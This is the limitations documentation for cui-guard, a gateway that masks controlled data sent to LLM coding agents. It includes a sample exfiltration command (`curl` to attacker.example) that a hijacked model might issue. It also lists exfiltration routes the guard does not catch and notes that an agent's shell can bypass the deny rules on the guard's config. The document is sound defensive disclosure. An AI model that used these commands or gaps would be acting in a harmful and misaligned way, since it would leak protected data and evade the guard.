# Limits of cui-guard

cui-guard is a technical control that reduces mistakes. It makes no statement about whether any use of an LLM is permitted for your data. Read this before relying on it.

## What it cannot promise

- **Pseudonymization is not anonymization.** Replacing a host, address, name or ticket key with a placeholder hides the value, but the surrounding text, the pattern of placeholders, and the structure of your work can still let someone re-identify what you are working on. Treat placeholders as a mistake-reducer, not as a privacy guarantee.
- **Short mapped values can be over-masked.** If a very short value is in the session map, it can be replaced inside longer words or numbers that merely contain it, and the model sees a garbled prompt.
- **Placeholders the model transforms are not restored.** If the model rewrites a placeholder (lowercases it, splits it, hashes it, or builds a new string from it), the reply is shown with the placeholder, or a mangled form of it, and the real value is not substituted back. Leftover placeholders in a reply raise a notice.
- **Marking rules are not all verified.** Detection patterns for CUI and classified markings are written from public guidance. Rules marked unverified have not been checked against primary sources (DoDI 5200.48, DoDI 5230.24, DoDM 5200.01). A missing or unusual marking will not be seen. Content with no marking and no recognizable pattern passes through.
- **Heuristics make mistakes both ways.** Controlled-content heuristics (scanner exports, firewall dumps, POA&M tables, STIG data) can miss real material and can flag harmless text. Identifier detection covers IPv4 only; IPv6 addresses and ranges are not handled. Slack `xoxe`/`xapp` tokens and secrets glued onto a name (`dbpassword=...`) are not recognized.
- **Line-start "(C) option" list items hard-block.** A list item such as `(C) option three` looks like a classified portion mark, and classified markings cannot be overridden. Reword the list item.
- **Authority phrases can hard-block ordinary prose.** "Classified by: the committee" blocks, because the colon form is treated as a classification authority line.
- **`fw_dump` is IPv4-only.** The firewall-dump heuristic ignores IPv6 ranges.
- **Query strings are not scanned.** A URL query string could carry a value past the guard. Only the request body and forwarded header values are inspected.
- **Header values are scanned, and a sensitive custom header stops every request.** The values of the headers the gateway forwards (for example those set through `ANTHROPIC_CUSTOM_HEADERS`) go through the same detectors as the body. `authorization` and `x-api-key` are not scanned, because they carry the agent's own login. If a header holds anything the lane would mask or block, every request hard-blocks (`header.sensitive`) and it cannot be overridden; remove the value from the agent's configuration. Headers cannot be rewritten, so they are never pseudonymized. The guard's own placeholders are ignored by shape.
- **Tool calls that name an outside host keep their placeholders.** A hostile or hijacked model can ask the agent to run something like `curl https://attacker.example/?q=person01@example.invalid`. In a tool call (Anthropic `tool_use` input, Responses `function_call` arguments, `custom_tool_call` input and `local_shell_call`/`shell_call`/`computer_call` actions, Chat `tool_calls` arguments), the decision is made once per call: if any string of the call names a destination outside your network, every placeholder in every string of that call is left as a placeholder instead of the real value. A call that mixes internal values with any outside host therefore withholds all of them. A destination is a URL, a `user@host` or `user@host:` form, a bare `name.tld` with a common TLD, or an IP literal. Internal means loopback, a host or IP placeholder from this session, a host under `mil`, `gov` or your configured domains, or an IP in the private ranges or your configured ranges. The gateway writes a `rehydrate.withheld` audit record (a count only) and raises the leftover-placeholder notice. Response text is still rehydrated, because it is only shown to you. Setting `egress_rehydration = "allow"` in the user config turns this off; it is a loosening that needs OS authentication. The built-in `withhold` is only the default; between the user and organization layers the stricter value wins.
  - **Residual: exfiltration with no visible host.** A tool call that sends data without naming the destination anywhere in the call is not caught: a script or alias that already holds an address, a destination supplied by an earlier call or a file, a numeric or hex IP outside a URL (`curl 3405803785`), a single-label host with no user (`scp f box:/tmp`), or a TLD left out of the list because it collides with file extensions (`.py`, `.sh`, `.dev`, `.zip` and others). The agent's own command-approval prompts are the control there.
  - **Over-withholding.** A tool call that names an outside host anywhere keeps all its placeholders even when the command is harmless (`git push https://github.com/... && echo person01@example.invalid`, or a file edit whose new text mentions a public URL), and four-part version numbers (`1.2.3.4`) count as IP literals.
- **Images and other opaque content are replaced, not read.** On public lanes they are removed and a notice is sent instead. On approved and local lanes they are forwarded without inspection, so a secret or identifier shown inside an image is not caught there. This exception is pinned by a leak test.

## Credentials and the agent

- **Passthrough trade-off.** In passthrough mode the agent keeps its own login and the gateway forwards it. The guard does not hold the credential, so it cannot stop the agent from reaching the provider by some route that skips the gateway. Use gateway credential mode when you need the guard to be the only path. In gateway mode the agent never sees the upstream key.
- **Consumer-plan data use.** Conversations on consumer plans may be used for model training under the provider's data-use terms. Check your plan settings before using passthrough with a consumer login.
- **A keyring-stored Codex ChatGPT login cannot be detected.** The launcher refuses when it finds a ChatGPT login in Codex's file store, but it cannot see one kept in the OS keyring.
- **Background agents cannot reach the gateway.** The session token is passed through the environment only and is never written to disk, so Claude Code background agents that do not inherit the shell environment get a 401 (the request fails closed). They are unusable under cui-guard in v1.
- **Other vendor keys may stay in the agent's environment.** The Claude launcher removes the lane's key variable, `ANTHROPIC_API_KEY`, `ANTHROPIC_AUTH_TOKEN` and the known provider-switch variables (Bedrock, Vertex, Foundry and similar), but other vendor keys such as `OPENAI_API_KEY` can remain in the agent's environment and are readable by the agent.
- **Organization pinning needs a fixed-port gateway.** The emitted Claude Code managed settings pin a fixed gateway URL, but v1 gateways use a random per-session port. Organizations cannot yet use provider pinning with the v1 launcher; this is planned for phase 2. Codex has no provider allowlist in its requirements file, so for Codex the provider can only be pinned by using the cui-guard launcher.

## Detection quirks

- **Protocol-relative uppercase hosts.** A link written like `//SAP.COM` can hard-block as a classified marking, and classified blocks cannot be overridden. Write the full URL in lowercase.
- **Marking-like URLs.** A URL such as `https://NOFORN.example` can trip a CUI-marking block on a public lane. This one can be overridden.
- **Line-ending normalization.** For detection only, Windows line endings (CRLF) are normalized before scanning. This does not change the text that is forwarded.
- **Tool schema property names are not scanned.** Descriptions and values in a tool's input schema are scanned, but the property names themselves are not. A sensitive word used as a property name can reach the upstream.
- **Streaming hold-back gap.** If a provider starts a text block with non-empty text in its opening event (the API normally sends an empty string), that first text bypasses the hold-back that rejoins split placeholders.
- **Newer Anthropic block types hard-block.** Content block types the adapter does not know yet (for example `tool_reference`) are treated as unparseable and hard-block the request until they are supported.
- **Sensitive model reasoning ends the session.** Thinking, redacted-thinking and reasoning text (summaries and full reasoning content) is scanned but cannot be rewritten without breaking its signature. If it holds anything the lane would mask or block, every request carrying that history hard-blocks (`history.thinking_sensitive`); start a fresh session. The guard's own placeholders (such as `person01@example.invalid`) are ignored there, by shape, so a real address in the 198.18.0.0/15 benchmarking range (the IP placeholder range) in reasoning text is not flagged. A false positive also ends the session, for example a name-like word that person-name detection flags, and it cannot be overridden.
- **Echoed response fields.** Top-level response fields that echo your request (such as `instructions`) are not restored from placeholders. This is cosmetic.
- **Settings-file credentials.** An `ANTHROPIC_API_KEY` or auth token set in a Claude settings file is not flagged by the launcher. Traffic still goes through the gateway, because the launcher's own settings take precedence for the base URL.
- **`cui-guard policy` view.** The default view does not show which layer each individual identifier literal came from. Use `--show-identifiers` only when it is safe to print them.
- **Audit hit counts include allowed hits.** Counts in the audit log include matches that policy allowed, so a count does not mean something was blocked or replaced.

## Data on disk

- **Agent transcripts stay on disk.** Claude Code and Codex write full conversation transcripts to the user's disk (for example under `~/.claude`). These hold the real values from before pseudonymization. cui-guard does not manage or encrypt them. The guard's own session map is kept in memory only.
- **The audit log holds no matched values**, but it records rule IDs, counts, hashes and override justifications. Written justifications are typed by a person, so do not put sensitive details in them.
- **UDP syslog delivery cannot be confirmed.** If an organization sink uses UDP, the guard cannot tell whether a record arrived.

## Approvals, overrides and the local user

- **The user config needs OS authentication at every launch when it loosens.** The user config and the approval snapshot live in directories the agent can write. The snapshot therefore never authorizes anything: whenever the user config loosens the built-in defaults (a higher-trust lane, the `general` profile, a lane given a credential, a default lane defined in the user config, enabled overrides, a moved audit log, `egress_rehydration = "allow"`), every launch asks for OS authentication, and `--headless` launches are refused. The snapshot only lets the prompt say what changed since your last approval. Only loosenings against the built-in defaults prompt. Removing protections you added yourself (an identifier literal or a stricter action) does not; the removal is only listed the next time something else triggers a prompt.
- **Same-user processes are not contained.** Any process running as you, including an agent with a shell, can read the gateway's memory (session map, upstream key in gateway mode) or kill the gateway. Killing it fails closed (the agent loses its endpoint), but cui-guard does not protect its own process from you or your agent.
- **Claude deny rules cover file-editing tools, not the shell.** The Claude launcher adds `Edit(//<path>/**)` deny rules for the cui-guard config and state directories (`//` anchors at the filesystem root). They stop Claude Code's built-in file-editing tools from writing there. Writes through the Bash tool (`echo >`, `sed -i`, and so on) are not covered.
- **Linux overrides and approvals need admin rights and a polkit agent.** Authentication uses `pkexec`, which needs an account allowed to authenticate as an administrator and a running polkit authentication agent. WSL2 and headless SSH sessions usually have no polkit agent, so overrides and loosened launches are refused there.
- **macOS overrides and approvals need the `[macos]` extra.** Touch ID / password prompts use `pyobjc-framework-LocalAuthentication`. Without `pipx install "cui-guard[macos]"`, overrides are unavailable and launches that need approval are refused.

## Availability and robustness

- **A pathological user regex can stall a session.** Python's regex engine cannot be interrupted. A catastrophic (ReDoS-prone) pattern in your own config makes scans time out. The request then fails closed (nothing is forwarded), but a worker thread stays busy, and repeated runaway scans can exhaust the worker pool. One gateway serves one session, so other sessions are not affected.
- **Requests over 32 MiB are refused.** The gateway answers 413 and does not contact the upstream.
- **Cross-origin and DNS-rebinding requests are refused.** A request with an `Origin` header, a cross-site `Sec-Fetch-Site`, or a `Host` that is not this gateway's loopback address and port gets 403. A top-level browser navigation is stopped by the session token, not by this guard.
- **Remote model servers need TLS.** An `http://` endpoint is accepted only for loopback hosts (`127.0.0.0/8`, `::1`, `localhost`); any other `http://` URL is a policy error. Put TLS in front of a remote model server and use `https://`. Certificate verification stays on and cannot be turned off.
- **Upstream redirects are not followed.** If the model server answers with a 3xx, the agent gets a 502 error, never the redirect or its `Location`.
- **Conflicting framing is refused.** A request with both `Content-Length` and `Transfer-Encoding` gets 400.
- **Latency.** The target is under 50 ms added per request on cached history, excluding optional name detection.

## Not supported

- **Cursor** is not supported in v1.
- Native Windows is out of scope. WSL2 works.
- Per-project mapping persistence is not implemented; the map is in memory for the session.

## Provider notes

- **Department of War contractors.** The Department of War has restricted Anthropic products (designated a supply-chain risk in March 2026; reportedly covering contractors on DoW work, subject to contract modification). cui-guard is provider-neutral and this does not change the tool, but check with your contracting officer before using any Anthropic endpoint for contract work.
- **Declared trust is yours.** An `approved` lane is whatever you declare. cui-guard does not check it.

## What was tested

The release gate is the canary suite in `tests/leak` (real gateway process, real HTTP, a recording fake upstream, synthetic canaries only). It covers the three wire formats, streaming and not, and public/approved/local lanes, plus tamper tests. The results of the real-agent smoke tests (`CUI_GUARD_REAL_AGENTS=1 pytest tests/integration`), run on macOS with Claude Code 2.1.309:

| Check | Result |
|---|---|
| `cui-guard claude -- -p ...` in passthrough mode reaches the gateway lane and exits 0 | Passed |
| No connection to `api.anthropic.com`, `statsig`, `datadoghq` or `sentry` during that run, observed through a recording `HTTPS_PROXY` (loopback excluded by `NO_PROXY`) | Passed; the proxy saw no targets at all. This shows no proxy-aware bypass traffic. Traffic that ignores proxy variables was not observed. |
| A project `.claude/settings.json` setting `ANTHROPIC_BASE_URL` does not override the launcher's `--settings` value | Passed (the request still reached the gateway) |
| The same with a user `~/.claude/settings.json` in an isolated temporary `HOME` | Not verified: an isolated `HOME` hides the macOS login keychain, so Claude Code could not log in. The project-level result above is the closest check. |
| Codex routing, and whether a custom provider bypasses a stored ChatGPT login | Not run: `codex` is not installed on the test machine. The Task 15 refusal remains in place and spec section 13 is unchanged. |

Also seen during the Claude run: Claude Code warned that the `Write(...)` deny rules the launcher then put in its settings file "are not matched by file permission checks" and that only `Edit(path)` rules apply. The launcher now emits only `Edit(//<absolute path>/**)` rules. The earlier rules used a single leading slash, which Claude Code reads as relative to the settings file, so they did not protect the intended directories. The real-agent runs above predate this change, and also predate the rule that a loosened user config needs OS authentication at every launch. The smoke tests write a user-defined lane and run `--headless`, so the launcher now refuses them until they are reworked.
